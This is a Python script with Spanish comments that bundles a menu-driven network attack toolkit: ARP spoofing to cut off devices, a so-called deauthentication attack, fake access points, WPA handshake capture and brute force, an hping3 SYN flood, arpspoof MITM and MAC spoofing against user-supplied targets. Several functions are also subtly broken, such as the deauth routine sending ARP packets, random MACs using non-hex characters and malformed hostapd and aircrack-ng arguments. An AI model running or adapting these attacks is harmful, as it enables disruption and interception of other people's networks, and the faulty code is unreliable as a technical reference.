import os
import subprocess
import time
from scapy.all import ARP, Ether, srp, send
import random
import string
from tabulate import tabulate
import socket


# Detecta la interfaz activa de red (WiFi o Ethernet)
def get_active_interface():
    interfaces = os.listdir('/sys/class/net/')
    for interface in interfaces:
        if "wlan" in interface or "eth" in interface:  # WiFi o Ethernet
            return interface
    return None


# Detecta y cambia la interfaz WiFi a modo monitor automáticamente
def enable_monitor_mode(interface):
    print(f"[+] Activando modo monitor en {interface}...")
    try:
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
        subprocess.run(['sudo', 'iw', interface, 'set', 'type', 'monitor'], check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
        print(f"[+] {interface} ahora está en modo monitor.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error al poner la interfaz {interface} en modo monitor: {e}")
        return False
    return True


# Escanea redes WiFi en busca de puntos de acceso
def scan_networks(interface):
    print("[+] Escaneando redes WiFi...")
    networks = []
    try:
        scan_result = subprocess.run(['sudo', 'iw', interface, 'scan'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        output = scan_result.stdout.decode('utf-8')
        networks = [line.split(' ')[1] for line in output.split('\n') if 'SSID' in line]
    except subprocess.CalledProcessError as e:
        print(f"[-] Error al escanear redes WiFi: {e}")
    return networks


# Escanea dispositivos conectados a la red
def scan_devices(ip_range):
    print("[+] Escaneando dispositivos conectados a la red...")
    arp_request = ARP(pdst=ip_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    devices = []
    for sent, received in answered_list:
        try:
            hostname = received.psrc
        except socket.herror:
            hostname = "Desconocido"
        devices.append({'IP': received.psrc, 'MAC': received.hwsrc, 'Hostname': hostname})
    return devices


# Bloquear un dispositivo
def block_device(target_ip, target_mac, gateway_ip, interface):
    print(f"[+] Bloqueando dispositivo {target_ip}...")
    spoofed_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    try:
        while True:
            send(spoofed_packet, iface=interface, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[+] Bloqueo detenido.")


# Desbloquear un dispositivo
def unblock_device(target_ip, target_mac, gateway_ip, gateway_mac, interface):
    print(f"[+] Desbloqueando dispositivo {target_ip}...")
    restore_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(restore_packet, iface=interface, count=4, verbose=False)
    print("[+] Dispositivo desbloqueado.")


# Realizar un ataque de desautenticación a un punto de acceso
def deauth_attack(target_mac, gateway_mac, interface):
    print(f"[+] Realizando ataque de desautenticación a {target_mac}...")
    try:
        while True:
            deauth_packet = Ether(dst=target_mac)/ARP(op=0, pdst=target_mac, hwdst=gateway_mac)
            send(deauth_packet, iface=interface, verbose=False)
            time.sleep(1)
    except KeyboardInterrupt:
        print("[+] Ataque detenido.")


# Hacer un spoofing de dirección MAC
def mac_spoof(interface):
    new_mac = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    print(f"[+] Haciendo spoofing de MAC en {interface} con nueva MAC: {new_mac}")
    subprocess.run(['sudo', 'ifconfig', interface, 'hw', 'ether', new_mac], check=True)


# Conectar a una red WiFi (WPA/WPA2)
def connect_wifi(ssid, password):
    print(f"[+] Conectando a la red {ssid} con la contraseña proporcionada...")
    subprocess.run(['sudo', 'nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password], check=True)


# Crear un punto de acceso falso
def create_fake_ap(interface, ssid):
    print(f"[+] Creando AP falso con SSID: {ssid}...")
    subprocess.run(['sudo', 'hostapd', '-B', interface, '-i', interface, 'ssid', ssid], check=True)


# Capturar contraseñas WiFi
def capture_wifi_passwords(interface):
    print("[+] Capturando contraseñas WiFi...")
    subprocess.run(['sudo', 'airodump-ng', '--write', 'capture', '--output-format', 'pcap', interface], check=True)


# Escanear puertos de un dispositivo
def port_scan(target_ip):
    print(f"[+] Escaneando puertos en {target_ip}...")
    subprocess.run(['sudo', 'nmap', target_ip], check=True)


# Hacer un ataque de fuerza bruta a una red WPA/WPA2
def brute_force_wpa(ssid, wordlist):
    print(f"[+] Iniciando ataque de fuerza bruta a {ssid}...")
    subprocess.run(['sudo', 'aircrack-ng', '-w', wordlist, '-b', ssid, 'capture.cap'], check=True)


# Comprobar vulnerabilidades de un router
def check_router_vulnerabilities(router_ip):
    print(f"[+] Comprobando vulnerabilidades del router {router_ip}...")
    subprocess.run(['sudo', 'nmap', '--script=vuln', router_ip], check=True)


# Ver rutas y conexiones en la red
def show_routes():
    print("[+] Mostrando las rutas en la red...")
    subprocess.run(['route', '-n'], check=True)


# Monitorear tráfico de red
def monitor_traffic(interface):
    print(f"[+] Monitoreando tráfico de red en {interface}...")
    subprocess.run(['sudo', 'tcpdump', '-i', interface], check=True)


# Realizar un ataque DoS
def dos_attack(target_ip):
    print(f"[+] Iniciando ataque DoS a {target_ip}...")
    subprocess.run(['sudo', 'hping3', '--flood', '--rand-source', '-p', '80', target_ip], check=True)


# Realizar un ataque MITM (Hombre en el medio)
def mitm_attack(target_ip, gateway_ip, interface):
    print(f"[+] Realizando ataque MITM a {target_ip}...")
    subprocess.run(['sudo', 'arpspoof', '-i', interface, '-t', f'{target_ip}', gateway_ip], check=True)


# Filtrar tráfico específico con Wireshark
def filter_traffic(filter_exp):
    print(f"[+] Filtrando tráfico con Wireshark con la expresión: {filter_exp}")
    subprocess.run(['sudo', 'wireshark', '-k', '-i', 'eth0', '-f', filter_exp], check=True)


# Ver estadísticas de la red
def network_statistics():
    print("[+] Mostrando estadísticas de la red...")
    subprocess.run(['netstat', '-s'], check=True)


# Realizar inyección de paquetes
def packet_injection(interface):
    print(f"[+] Realizando inyección de paquetes en {interface}...")
    subprocess.run(['sudo', 'aireplay-ng', '--deauth', '10', '-a', 'target_ap_mac', '-c', 'target_mac', interface], check=True)


# Función principal con menú interactivo
def main():
    interface = get_active_interface()
    if not interface:
        print("[-] No se encontró una interfaz activa.")
        return

    print(f"[+] Interfaz activa detectada: {interface}")

    if "wlan" in interface:
        if not enable_monitor_mode(interface):
            return

    # Obtener dirección IP de la red
    ip_range = "192.168.1.0/24"  # Cambia esto según tu configuración

    while True:
        print("\nOpciones:")
        print("1. Escanear redes WiFi")
        print("2. Escanear dispositivos conectados a la red")
        print("3. Bloquear dispositivo")
        print("4. Desbloquear dispositivo")
        print("5. Realizar ataque de desautenticación")
        print("6. Monitorear tráfico de red")
        print("7. Conectar a una red WiFi (WPA/WPA2)")
        print("8. Crear AP falso")
        print("9. Capturar contraseñas WiFi")
        print("10. Escanear puertos de un dispositivo")
        print("11. Realizar un ataque de fuerza bruta a WPA/WPA2")
        print("12. Comprobar vulnerabilidades de un router")
        print("13. Ver rutas y conexiones en la red")
        print("14. Realizar un ataque DoS")
        print("15. Realizar un ataque MITM")
        print("16. Filtrar tráfico con Wireshark")
        print("17. Ver estadísticas de la red")
        print("18. Hacer spoofing de dirección MAC")
        print("19. Realizar inyección de paquetes")
        print("20. Salir")
        
        choice = input("Selecciona una opción: ")

        if choice == "1":
            networks = scan_networks(interface)
            print(f"[+] Redes WiFi detectadas: {networks}")
        elif choice == "2":
            devices = scan_devices(ip_range)
            print(tabulate(devices, headers="keys", tablefmt="pretty"))
        elif choice == "3":
            target_ip = input("Introduce la IP del dispositivo a bloquear: ")
            target_mac = input("Introduce la MAC del dispositivo a bloquear: ")
            gateway_ip = "192.168.1.1"  # Cambia esto por tu puerta de enlace
            block_device(target_ip, target_mac, gateway_ip, interface)
        elif choice == "4":
            target_ip = input("Introduce la IP del dispositivo a desbloquear: ")
            target_mac = input("Introduce la MAC del dispositivo a desbloquear: ")
            gateway_ip = "192.168.1.1"  # Cambia esto por tu puerta de enlace
            gateway_mac = "00:11:22:33:44:55"  # Cambia esto por la MAC de tu puerta de enlace
            unblock_device(target_ip, target_mac, gateway_ip, gateway_mac, interface)
        elif choice == "5":
            target_mac = input("Introduce la MAC del AP objetivo: ")
            gateway_mac = "00:11:22:33:44:55"  # Cambia esto por la MAC de tu gateway
            deauth_attack(target_mac, gateway_mac, interface)
        elif choice == "6":
            monitor_traffic(interface)
        elif choice == "7":
            ssid = input("Introduce el SSID: ")
            password = input("Introduce la contraseña: ")
            connect_wifi(ssid, password)
        elif choice == "8":
            ssid = input("Introduce el SSID del AP falso: ")
            create_fake_ap(interface, ssid)
        elif choice == "9":
            capture_wifi_passwords(interface)
        elif choice == "10":
            target_ip = input("Introduce la IP del dispositivo a escanear: ")
            port_scan(target_ip)
        elif choice == "11":
            ssid = input("Introduce el SSID de la red: ")
            wordlist = input("Introduce la ruta del archivo de palabras (wordlist): ")
            brute_force_wpa(ssid, wordlist)
        elif choice == "12":
            router_ip = input("Introduce la IP del router: ")
            check_router_vulnerabilities(router_ip)
        elif choice == "13":
            show_routes()
        elif choice == "14":
            target_ip = input("Introduce la IP del objetivo para el ataque DoS: ")
            dos_attack(target_ip)
        elif choice == "15":
            target_ip = input("Introduce la IP del objetivo para el ataque MITM: ")
            gateway_ip = "192.168.1.1"  # Cambia esto por tu puerta de enlace
            mitm_attack(target_ip, gateway_ip, interface)
        elif choice == "16":
            filter_exp = input("Introduce la expresión de filtro para Wireshark: ")
            filter_traffic(filter_exp)
        elif choice == "17":
            network_statistics()
        elif choice == "18":
            mac_spoof(interface)
        elif choice == "19":
            packet_injection(interface)
        elif choice == "20":
            print("[+] Saliendo...")
            break
        else:
            print("[-] Opción inválida.")


if __name__ == "__main__":
    main()
